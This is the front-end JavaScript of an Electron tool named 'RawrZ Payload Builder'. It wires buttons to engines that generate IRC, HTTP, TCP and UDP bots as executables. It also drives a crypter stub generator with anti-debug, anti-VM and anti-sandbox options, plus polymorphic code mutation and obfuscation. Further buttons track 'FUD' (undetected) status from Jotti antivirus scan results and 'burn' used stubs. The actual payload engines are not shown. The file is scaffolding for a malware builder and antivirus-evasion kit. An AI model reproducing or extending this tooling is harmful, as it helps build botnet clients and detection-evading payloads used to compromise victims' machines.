let selectedFile = null;
let selectedFiles = [];
let selectedDir = null;
let encryptedData = null;

// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
  console.log('🔧 DOM loaded, initializing RawrZ Payload Builder...');

  // Add missing log function globally
  window.log = function(message) {
    const output = document.getElementById('output');
    if (output) {
      const timestamp = new Date().toLocaleTimeString();
      output.textContent += `[${timestamp}] ${message}\n`;
      output.scrollTop = output.scrollHeight;
    }
    console.log(message);
  };
  
  const tabs = document.querySelectorAll('.tab');
  if (tabs.length === 0) {
    console.warn('⚠️ No tabs found in DOM');
    return;
  }
  
  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
      
      tab.classList.add('active');
      document.getElementById(tab.dataset.tab).classList.add('active');
      
      // Setup stub generator when payloads tab is clicked
      if (tab.dataset.tab === 'payloads') {
        setTimeout(() => {
          setupStubGenerator();
        }, 100);
      }
    });
  });

  // File selection with null checks
  const selectFileBtn = document.getElementById('selectFile');
  if (selectFileBtn) {
    selectFileBtn.addEventListener('click', async () => {
      try {
        selectedFile = await window.electronAPI.selectFile();
        log(`Selected file: ${selectedFile}`);
      } catch (error) {
        log(`Error selecting file: ${error.message}`);
      }
    });
  }

  const selectFilesBtn = document.getElementById('selectFiles');
  if (selectFilesBtn) {
    selectFilesBtn.addEventListener('click', async () => {
      try {
        selectedFiles = await window.electronAPI.selectFiles();
        log(`Selected ${selectedFiles.length} files`);
      } catch (error) {
        log(`Error selecting files: ${error.message}`);
      }
    });
  }

  const selectDirBtn = document.getElementById('selectDir');
  if (selectDirBtn) {
    selectDirBtn.addEventListener('click', async () => {
      try {
        selectedDir = await window.electronAPI.selectDirectory();
        log(`Selected directory: ${selectedDir}`);
      } catch (error) {
        log(`Error selecting directory: ${error.message}`);
      }
    });
  }

  // File operations with null checks
  const hashBtn = document.getElementById('hashBtn');
  if (hashBtn) {
    hashBtn.addEventListener('click', async () => {
      if (!selectedFile) return log('No file selected');
      try {
        const hash = await window.electronAPI.hashFile(selectedFile);
        log(`SHA-256: ${hash}`);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const compressBtn = document.getElementById('compressBtn');
  if (compressBtn) {
    compressBtn.addEventListener('click', async () => {
      if (!selectedFile) return log('No file selected');
      try {
        const compressed = await window.electronAPI.compressFile(selectedFile);
        log(`Compressed to: ${compressed}`);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const decompressBtn = document.getElementById('decompressBtn');
  if (decompressBtn) {
    decompressBtn.addEventListener('click', async () => {
      if (!selectedFile) return log('No file selected');
      try {
        const decompressed = await window.electronAPI.decompressFile(selectedFile);
        log(`Decompressed to: ${decompressed}`);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const createArchiveBtn = document.getElementById('createArchiveBtn');
  if (createArchiveBtn) {
    createArchiveBtn.addEventListener('click', async () => {
      if (selectedFiles.length === 0) return log('No files selected');
      try {
        const outputPath = selectedFiles[0] + '.zip';
        const archive = await window.electronAPI.createArchive(selectedFiles, outputPath);
        log(`Archive created: ${archive}`);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const extractArchiveBtn = document.getElementById('extractArchiveBtn');
  if (extractArchiveBtn) {
    extractArchiveBtn.addEventListener('click', async () => {
      if (!selectedFile || !selectedDir) return log('Select archive file and output directory');
      try {
        const extracted = await window.electronAPI.extractArchive(selectedFile, selectedDir);
        log(`Extracted to: ${extracted}`);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  // Crypto operations
  const encryptBtn = document.getElementById('encryptBtn');
  if (encryptBtn) {
    encryptBtn.addEventListener('click', async () => {
      const text = document.getElementById('textInput')?.value;
      const password = document.getElementById('password')?.value;
      if (!text || !password) return log('Enter text and password');
    
      try {
        const method = prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
        encryptedData = await window.rawrz.encryptTextDemo(text, password, method);
        log(`🔒 Text encrypted with ${encryptedData.method}!`);
        log(`📋 Encrypted: ${encryptedData.cipherTextHex}`);
        log(`🔑 Key: ${encryptedData.keyHex}`);
      } catch (error) {
        log(`❌ Encryption error: ${error.message}`);
      }
    });
  }

  const decryptBtn = document.getElementById('decryptBtn');
  if (decryptBtn) {
    decryptBtn.addEventListener('click', async () => {
      const password = document.getElementById('password').value;
      if (!encryptedData || !password) return log('❌ No encrypted data or password');
    
      try {
        const method = encryptedData.method || prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
        const decrypted = await window.rawrz.decryptTextDemo(encryptedData.cipherTextHex, encryptedData.keyHex, method);
        log(`🔓 Text decrypted: ${decrypted}`);
      } catch (error) {
        log(`❌ Decryption error: ${error.message}`);
      }
    });
  }

  // File encryption handlers
  const encryptFileBtn = document.getElementById('encryptFileBtn');
  if (encryptFileBtn) {
    encryptFileBtn.addEventListener('click', async () => {
      if (!selectedFile) return log('❌ No file selected for encryption');
    
      try {
        const password = prompt('Enter encryption password:');
        if (!password) return log('❌ Password required for encryption');
        
        const method = prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
        const extension = prompt('Select extension (.enc/.encrypted/.rawrz/.locked):', '.enc');
        
        const result = await window.rawrz.encryptFile(selectedFile, null, null, null, method, extension);
        log(`🔒 File encrypted successfully!`);
        log(`📁 Output: ${result.outPath}`);
        log(`🔑 Key: ${result.keyHex}`);
        log(`📊 Size: ${result.sizeIn} → ${result.sizeOut} bytes`);
        log(`🔧 Method: ${result.method}`);
      } catch (error) {
        log(`❌ Encryption error: ${error.message}`);
      }
    });
  }

  const decryptFileBtn = document.getElementById('decryptFileBtn');
  if (decryptFileBtn) {
    decryptFileBtn.addEventListener('click', async () => {
      if (!selectedFile) return log('❌ No file selected for decryption');
    
      try {
        const key = prompt('Enter decryption key (hex):');
        if (!key) return log('❌ Decryption key required');
        
        const result = await window.rawrz.decryptFile(selectedFile, null, null, key);
        log(`🔓 File decrypted successfully!`);
        log(`📁 Output: ${result.outPath}`);
        log(`📊 Size: ${result.sizeOut} bytes`);
        log(`🔧 Method: ${result.method}`);
      } catch (error) {
        log(`❌ Decryption error: ${error.message}`);
      }
    });
  }

  // Jotti FUD tracker handlers
  const parseJottiBtn = document.getElementById('parseJottiBtn');
  if (parseJottiBtn) {
    parseJottiBtn.addEventListener('click', async () => {
      const jottiText = document.getElementById('jottiInput').value.trim();
      if (!jottiText) return log('❌ Paste Jotti scan results first');
    
      try {
        const results = await window.rawrz.parseJotti(jottiText);
        const resultsDiv = document.getElementById('jottiResults');
        
        if (results.fud) {
          resultsDiv.innerHTML = `
            <div class="fud-status fud">
              <span class="badge fud">✅ FUD ACHIEVED</span>
              <div class="fud-details">${results.detections}/${results.total} detections (${Math.round((1 - results.detections/results.total) * 100)}% undetected)</div>
            </div>
          `;
          log(`🎯 FUD SUCCESS: ${results.detections}/${results.total} detections`);
        } else {
          resultsDiv.innerHTML = `
            <div class="fud-status detected">
              <span class="badge detected">⚠️ DETECTED</span>
              <div class="detection-details">${results.detections}/${results.total} detections (${Math.round((results.detections/results.total) * 100)}% detected)</div>
            </div>
          `;
          log(`🚨 DETECTED: ${results.detections}/${results.total} scanners flagged this file`);
        }
        
        if (results.scanners.length > 0) {
          const scannerList = results.scanners.map(s => `${s.name}: ${s.result}`).join(', ');
          log(`📋 Scanner details: ${scannerList}`);
        }
      } catch (error) {
        log(`❌ Jotti parsing error: ${error.message}`);
      }
    });
  }

  const clearJottiBtn = document.getElementById('clearJottiBtn');
  if (clearJottiBtn) {
    clearJottiBtn.addEventListener('click', () => {
      document.getElementById('jottiInput').value = '';
      document.getElementById('jottiResults').innerHTML = '';
      log('🧹 Jotti results cleared');
    });
  }

  // Load all engines with enhanced system
  const loadEnginesBtn = document.getElementById('loadEngines');
  if (loadEnginesBtn) {
    loadEnginesBtn.addEventListener('click', async () => {
      await loadEngineSystem();
    });
  }

  // Bot Generators with executable output
  const ircBotBtn = document.getElementById('ircBotGen');
  if (ircBotBtn) {
    ircBotBtn.addEventListener('click', async () => {
      try {
        log('🤖 Configuring IRC Bot Generator...');
        const menuConfig = await showEngineMenu('irc-bot-generator');

        if (menuConfig) {
          log('📝 Available Configuration Options:');
          Object.entries(menuConfig.menu).forEach(([key, config]) => {
            const opts = config.options ? ` (${config.options.join(', ')})` : '';
            log(`  • ${config.label}: ${config.type}${opts}`);
          });

          const format = document.getElementById('outputFormat')?.value || 'exe';
          const useSSL = document.getElementById('useFileSSL')?.checked || false;
          const result = await window.electronAPI.executeEngine('irc-bot-generator', {
            server: 'irc.freenode.net',
            channel: '#test',
            nick: 'RawrBot',
            outputFormat: format,
            encryption: useSSL
          });
          log(`🤖 IRC Bot Generated as ${format.toUpperCase()}`);
          log(result);
          updateStats('generatedPayloads');
        }
      } catch (error) {
        log(`❌ IRC Bot error: ${error.message}`);
      }
    });
  }

  const httpBotBtn = document.getElementById('httpBotGen');
  if (httpBotBtn) {
    httpBotBtn.addEventListener('click', async () => {
      try {
        log('🌐 Configuring HTTP Bot Generator...');
        const menuConfig = await showEngineMenu('http-bot-generator');
        
        if (menuConfig) {
          log('🔧 HTTP Bot Configuration Options:');
          Object.entries(menuConfig.menu).forEach(([key, config]) => {
            if (config.options && config.options.length > 0) {
              log(`  • ${config.label}: ${config.options.join(', ')}`);
            } else {
              log(`  • ${config.label}: ${config.type}`);
            }
          });
          
          const format = document.getElementById('outputFormat').value;
          const useSSL = document.getElementById('useFileSSL').checked;
          const result = await window.electronAPI.executeEngine('http-bot-generator', {
            endpoint: 'http://localhost:8080/api',
            method: 'POST',
            auth: 'bearer',
            format: 'json',
            interval: 5000,
            outputFormat: format,
            encryption: useSSL
          });
          log(`🌐 HTTP Bot Generated as ${format.toUpperCase()}`);
          log(result);
          updateStats('generatedPayloads');
        }
      } catch (error) {
        log(`❌ HTTP Bot error: ${error.message}`);
      }
    });
  }

  const tcpBotBtn = document.getElementById('tcpBotGen');
  if (tcpBotBtn) {
    tcpBotBtn.addEventListener('click', async () => {
      try {
        const format = document.getElementById('outputFormat')?.value || 'exe';
        const result = await window.electronAPI.executeEngine('tcp-bot-generator', {
          host: '127.0.0.1',
          port: 4444,
          outputFormat: format
        });
        log(`🔌 TCP Bot Generated as ${format.toUpperCase()}`);
        log(result);
        updateStats('generatedPayloads');
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const udpBotBtn = document.getElementById('udpBotGen');
  if (udpBotBtn) {
    udpBotBtn.addEventListener('click', async () => {
      try {
        const format = document.getElementById('outputFormat')?.value || 'exe';
        const result = await window.electronAPI.executeEngine('udp-bot-generator', {
          host: '127.0.0.1',
          port: 5555,
          outputFormat: format
        });
        log(`📡 UDP Bot Generated as ${format.toUpperCase()}`);
        log(result);
        updateStats('generatedPayloads');
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  // Advanced operations with null checks
  const binaryAnalysisBtn = document.getElementById('binaryAnalysis');
  if (binaryAnalysisBtn) {
    binaryAnalysisBtn.addEventListener('click', async () => {
      try {
        const result = await window.electronAPI.executeEngine('malware-analysis');
        log('🔍 Binary Analysis - ACTIVATED');
        log(result);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const networkScanBtn = document.getElementById('networkScan');
  if (networkScanBtn) {
    networkScanBtn.addEventListener('click', async () => {
      try {
        const result = await window.electronAPI.executeEngine('network-tools');
        log('🌐 Network Scanner - ACTIVATED');
        log(result);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const stegoHideBtn = document.getElementById('stegoHide');
  if (stegoHideBtn) {
    stegoHideBtn.addEventListener('click', async () => {
      try {
        const result = await window.electronAPI.executeEngine('stealth-engine');
        log('🖼️ Steganography - ACTIVATED');
        log(result);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  const obfuscateCodeBtn = document.getElementById('obfuscateCode');
  if (obfuscateCodeBtn) {
    obfuscateCodeBtn.addEventListener('click', async () => {
      try {
        const result = await window.electronAPI.executeEngine('polymorphic-engine');
        log('🔒 Code Obfuscator - ACTIVATED');
        log(result);
      } catch (error) {
        log(`Error: ${error.message}`);
      }
    });
  }

  // Initialize stub generator
  setupStubGenerator();

  // Auto-initialize enhanced engine system
  setTimeout(() => {
    if (typeof window.rawrz !== 'undefined') {
      displayEngineRegistry();
    }
  }, 2000);

}); // End DOMContentLoaded event listener

// Enhanced engine system with dynamic menu generation
async function loadEngineSystem() {
  try {
    const engines = await window.rawrz.getEngines();
    log(`🚀 Loading enhanced engine system with ${engines.engines.length} engines...`);
    
    const categories = {};
    engines.engines.forEach(engine => {
      if (!categories[engine.category]) {
        categories[engine.category] = [];
      }
      categories[engine.category].push(engine);
    });
    
    Object.entries(categories).forEach(([category, categoryEngines]) => {
      log(` ${category}:`);
      categoryEngines.forEach(engine => {
        const status = engine.enabled ? '✅ ENABLED' : '⭕ DISABLED';
        log(`  ${engine.icon} ${engine.name} - ${status}`);
      });
    });
    
    log(`✅ Engine system loaded successfully`);
    updateStats('loadedEngines', engines.engines.length);
    
    return engines;
  } catch (error) {
    log(`❌ Engine loading error: ${error.message}`);
    return null;
  }
}

async function showEngineMenu(engineId) {
  try {
    const menuConfig = await window.rawrz.generateEngineMenu(engineId);
    const engine = await window.rawrz.getEngineConfig(engineId);
    
    log(`🔧 Loading ${engine.icon} ${engine.name} configuration menu...`);
    
    Object.entries(menuConfig.menu).forEach(([key, config]) => {
      let optionsStr = '';
      if (config.options && config.options.length > 0) {
        optionsStr = ` (${config.options.join(', ')})`;
      }
      
      const required = config.required ? ' *REQUIRED*' : '';
      log(`  📋 ${config.label}${required}: ${config.type}${optionsStr}`);
    });
    
    if (menuConfig.categories.length > 0) {
      log(`🏷️ Available features: ${menuConfig.categories.join(', ')}`);
    }
    
    return menuConfig;
  } catch (error) {
    log(`❌ Menu generation error: ${error.message}`);
    return null;
  }
}

async function executeEngine(engineName) {
  try {
    const result = await window.electronAPI.executeEngine(engineName);
    log(`🚀 Engine ${engineName} executed`);
    log(result);
  } catch (error) {
    log(`Error executing ${engineName}: ${error.message}`);
  }
}

function updateStats(statId, increment = 1) {
  const element = document.getElementById(statId);
  if (element) {
    const current = parseInt(element.textContent) || 0;
    element.textContent = current + increment;
  }
}

function setupStubGenerator() {
  log('🔧 Setting up stub generator...');
  
  const browsePayload = document.getElementById('browsePayload');
  if (browsePayload) {
    browsePayload.onclick = async () => {
      log('🔍 Browse payload clicked');
      try {
        const file = await window.electronAPI.selectFile();
        if (file) {
          document.getElementById('stubPayloadPath').value = file;
          log(`Selected payload: ${file}`);
        }
      } catch (error) {
        log(`Error selecting file: ${error.message}`);
      }
    };
  }
  
  const browseOutput = document.getElementById('browseOutput');
  if (browseOutput) {
    browseOutput.onclick = () => {
      log('💾 Browse output clicked');
      try {
        const stubType = document.getElementById('stubType').value;
        const extensions = {
          cpp: '.cpp', csharp: '.cs', python: '.py', powershell: '.ps1',
          java: '.java', go: '.go', rust: '.rs', javascript: '.js',
          asm: '.asm', advanced: '.exe'
        };
        
        const payloadPath = document.getElementById('stubPayloadPath').value;
        const baseName = payloadPath ? payloadPath.split('\\').pop().split('.')[0] : 'stub';
        const defaultPath = `${baseName}_${stubType}_stub${extensions[stubType]}`;
        document.getElementById('stubOutputPath').value = defaultPath;
        log(`Output path set: ${defaultPath}`);
      } catch (error) {
        log(`Error setting output path: ${error.message}`);
      }
    };
  }
  
  const generateStub = document.getElementById('generateStub');
  if (generateStub) {
    generateStub.onclick = async () => {
      log('🔥 Generate stub clicked');
      const payloadPath = document.getElementById('stubPayloadPath').value;
      const stubType = document.getElementById('stubType').value;
      const encryption = document.getElementById('stubEncryption').value;
      const outputPath = document.getElementById('stubOutputPath').value;
      const antiDebug = document.getElementById('antiDebug').checked;
      const antiVM = document.getElementById('antiVM').checked;
      const antiSandbox = document.getElementById('antiSandbox').checked;
      
      if (!payloadPath) {
        log('❌ Please select a payload file');
        return;
      }
      
      try {
        log(`🔥 Generating ${stubType.toUpperCase()} stub with ${encryption}...`);
        const result = await window.electronAPI.generateStub(payloadPath, {
          stubType,
          encryptionMethod: encryption,
          outputPath,
          includeAntiDebug: antiDebug,
          includeAntiVM: antiVM,
          includeAntiSandbox: antiSandbox
        });
        
        log(`✅ Stub generated successfully!`);
        log(`📄 Output: ${result.outputPath}`);
        log(`📊 Payload size: ${result.payloadSize} bytes`);
        updateStats('generatedPayloads', 1);
        
      } catch (error) {
        log(`❌ Stub generation failed: ${error.message}`);
      }
    };
  }
  
  const clearStubConfig = document.getElementById('clearStubConfig');
  if (clearStubConfig) {
    clearStubConfig.onclick = () => {
      document.getElementById('stubPayloadPath').value = '';
      document.getElementById('stubOutputPath').value = '';
      document.getElementById('stubType').selectedIndex = 0;
      document.getElementById('stubEncryption').selectedIndex = 0;
      document.getElementById('antiDebug').checked = true;
      document.getElementById('antiVM').checked = true;
      document.getElementById('antiSandbox').checked = true;
      log('🧹 Stub configuration cleared');
    };
  }
}

function log(message) {
  const output = document.getElementById('output');
  if (output) {
    const timestamp = new Date().toLocaleTimeString();
    output.textContent += `[${timestamp}] ${message}\n`;
    output.scrollTop = output.scrollHeight;
  }
  console.log(message);
}

window.showEngineMenu = showEngineMenu;

async function displayEngineRegistry() {
  try {
    const engines = await window.rawrz.getEngines();
    log('🔧 Enhanced Engine Registry Loaded:');
    
    engines.engines.forEach(engine => {
      log(`${engine.icon} ${engine.name} [${engine.category}]`);
      log(`  Status: ${engine.enabled ? '✅ ENABLED' : '⭕ DISABLED'}`);
      log(`  Features: ${Object.keys(engine.features).length} categories`);
      log(`  Menu Items: ${Object.keys(engine.menu).length} options`);
    });
    
    log('💡 Use "Configure" buttons or loadEngines() to see detailed options');
    return engines;
  } catch (error) {
    log(`❌ Registry display error: ${error.message}`);
  }
}

window.generateStubs = async function() {
  try {
    log('🏗️ Generating FUD stubs...');
    const result = await window.rawrz.executeEngine('stub-generator', {
      count: 5,
      type: 'polymorphic',
      encryption: 'aes-256-gcm'
    });
    if (result.success) {
      log(`✅ Generated ${result.data.stubCount} new stubs`);
      updateStubStatus();
    } else {
      log(`❌ Stub generation failed: ${result.error}`);
    }
  } catch (error) {
    log(`❌ Error generating stubs: ${error.message}`);
  }
};

window.useStub = async function() {
  try {
    log('🔥 Using next available stub...');
    const result = await window.rawrz.executeEngine('stub-generator', {
      action: 'use-next'
    });
    if (result.success) {
      log(`✅ Using stub: ${result.data.stubId}`);
      updateStubStatus();
    } else {
      log(`❌ No available stubs: ${result.error}`);
    }
  } catch (error) {
    log(`❌ Error using stub: ${error.message}`);
  }
};

window.burnCurrentStub = async function() {
  try {
    log('🔥 Burning current stub...');
    const result = await window.rawrz.executeEngine('stub-generator', {
      action: 'burn-current'
    });
    if (result.success) {
      log(`✅ Stub burned: ${result.data.stubId}`);
      updateStubStatus();
    } else {
      log(`❌ Burn failed: ${result.error}`);
    }
  } catch (error) {
    log(`❌ Error burning stub: ${error.message}`);
  }
};

window.checkStubStatus = async function() {
  try {
    const status = await window.rawrz.getStubStatus();
    log(`📊 Stub Status: ${status.active} Active | ${status.burned} Burned | ${status.total} Total`);
    updateStubStatus();
  } catch (error) {
    log(`❌ Error checking stub status: ${error.message}`);
  }
};

window.runPolymorphicEngine = async function() {
  try {
    log('🔄 Running polymorphic engine...');
    const result = await window.rawrz.executeEngine('polymorphic', {
      mutations: 10,
      obfuscation: 'high'
    });
    if (result.success) {
      log(`✅ Polymorphic transformation complete`);
    }
  } catch (error) {
    log(`❌ Polymorphic engine error: ${error.message}`);
  }
};

window.mutateCode = async function() {
  try {
    log('🧬 Mutating code structure...');
    const result = await window.rawrz.executeEngine('polymorphic', {
      action: 'mutate',
      intensity: 'medium'
    });
    if (result.success) {
      log(`✅ Code mutation applied`);
    }
  } catch (error) {
    log(`❌ Code mutation error: ${error.message}`);
  }
};

window.enableAntiAnalysis = async function() {
  try {
    log('🛡️ Enabling anti-analysis protection...');
    const result = await window.rawrz.executeEngine('anti-analysis', {
      protection: 'full',
      vm_detection: true,
      debugger_detection: true
    });
    if (result.success) {
      log(`✅ Anti-analysis protection enabled`);
    }
  } catch (error) {
    log(`❌ Anti-analysis error: ${error.message}`);
  }
};

window.testAntiAnalysis = async function() {
  try {
    log('🧪 Testing anti-analysis protection...');
    const result = await window.rawrz.executeEngine('anti-analysis', {
      action: 'test'
    });
    if (result.success) {
      log(`✅ Protection test: ${result.data.status}`);
    }
  } catch (error) {
    log(`❌ Protection test error: ${error.message}`);
  }
};

async function updateStubStatus() {
  try {
    const status = await window.rawrz.getStubStatus();
    const statusElement = document.getElementById('stubStatus');
    if (statusElement) {
      statusElement.textContent = `Stubs: ${status.active} Active | ${status.burned} Burned`;
    }
  } catch (error) {
    log(`❌ Error updating stub status: ${error.message}`);
  }
}
